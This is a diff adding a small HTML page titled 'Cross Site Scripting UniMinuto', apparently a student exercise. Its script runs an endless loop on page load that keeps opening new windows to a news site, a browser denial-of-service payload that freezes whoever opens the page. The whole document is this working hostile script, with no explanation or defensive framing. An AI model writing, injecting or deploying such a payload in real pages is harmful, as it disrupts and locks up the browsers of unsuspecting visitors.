@@ -1,0 +1,19 @@
+<html>
+  <head>
+    <title>
+      Cross Site Scripting UniMinuto
+    </title>
+    <script>
+      function DOS(){
+        window.open('https://www.pulzo.com');
+      }
+
+      for(;;){
+        DOS();
+      }
+    </script>
+  </head>
+  <body>
+    Cross Site Scripting UniMinuto
+  </body>
+</html>
